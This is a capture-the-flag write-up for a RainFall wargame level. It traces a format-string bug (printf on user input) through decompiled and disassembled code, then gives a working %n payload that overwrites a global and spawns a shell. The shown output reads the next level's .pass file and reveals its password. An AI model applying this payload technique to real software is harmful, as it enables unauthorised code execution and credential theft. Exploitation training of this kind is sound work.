decompiling the binary in level3 home folder we get:

/--------------------------------------------------------/
    int32_t main(int32_t argc, char** argv, char** envp)

        08048526  return v()
/--------------------------------------------------------/
    uint32_t v()

        080484c7  void var_20c
        080484c7  fgets(&var_20c, 512, *stdin)
        080484d5  printf(&var_20c)
        080484da  uint32_t eax_1 = *m
        080484df  if (eax_1 == 64)                                              ## WTF is *m
        08048507      fwrite(0x8048600, 1, 0xc, *stdout)  {"Wait what?!\n"}
        08048513      eax_1 = system(0x804860d)  {"/bin/sh"}                    ## if we get eax_1 to verify the condition, a shell will run on lvl4
        08048519  return eax_1
/--------------------------------------------------------/

gdb:

    disas v
            0x080484a4 <+0>:     push   %ebp
            0x080484a5 <+1>:     mov    %esp,%ebp
            0x080484a7 <+3>:     sub    $0x218,%esp
            0x080484ad <+9>:     mov    0x8049860,%eax
            0x080484b2 <+14>:    mov    %eax,0x8(%esp)
            0x080484b6 <+18>:    movl   $0x200,0x4(%esp)
            0x080484be <+26>:    lea    -0x208(%ebp),%eax
            0x080484c4 <+32>:    mov    %eax,(%esp)
            0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
            0x080484cc <+40>:    lea    -0x208(%ebp),%eax
            0x080484d2 <+46>:    mov    %eax,(%esp)
            0x080484d5 <+49>:    call   0x8048390 <printf@plt>
            0x080484da <+54>:    mov    0x804988c,%eax              <-  that misterious "m" is just a direction in memory. The program is obviously inciting us to modify this exact address to 64
            0x080484df <+59>:    cmp    $0x40,%eax
            0x080484e2 <+62>:    jne    0x8048518 <v+116>
            0x080484e4 <+64>:    mov    0x8049880,%eax
            0x080484e9 <+69>:    mov    %eax,%edx
            0x080484eb <+71>:    mov    $0x8048600,%eax
            0x080484f0 <+76>:    mov    %edx,0xc(%esp)
            0x080484f4 <+80>:    movl   $0xc,0x8(%esp)
            0x080484fc <+88>:    movl   $0x1,0x4(%esp)
            0x08048504 <+96>:    mov    %eax,(%esp)
            0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>
            0x0804850c <+104>:   movl   $0x804860d,(%esp)
            0x08048513 <+111>:   call   0x80483c0 <system@plt>

/--------------------------------------------------------/

There is a call on printf of the user input, which allows to exploit this vulnerability:
https://web.ecs.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf
(explained in the part "writing an integer to nearly any location...")


We can see the stack just by printing it:
    level3@RainFall:~$ ./level3 
    "%08x %08x %08x %08x %08x"
    "00000200 b7fd1ac0 b7ff37d0 38302522 30252078"

python -c  'print "AAAA" + "%p "*10 ' | ./level3
$    AAAA0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520
                                        This
                                        the 4th argument shows 'A' (0x414141) so we should write to this address, $4.

Plus, we can directly write on specific addresses of the stack by using the %n formatter.
We have to tell printf 
We want to write '64' value on 0x804988c address, so the syntax would be:

python -c 'print "\x8c\x98\x04\x08" + "A"*(64 - 4) + "%4$n" ' > /tmp/expl; cat /tmp/expl - | ./level3
                    |                  |                |
                    |                  |                |Write n bytes printed to the 4th argument (the address to write)
                    |                  |
                    |                  |
                    |                  |Padding to reach 64 bytes printed
                    |
                    |Address to write

/--------------------------------------------------------/

    level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "A"*(64 - 4) + "%4$n" ' > /tmp/expl; cat /tmp/expl - | ./level3
    ???AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Wait what?!
    cat /home/user/level4/.pass
    b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa

Bingo :D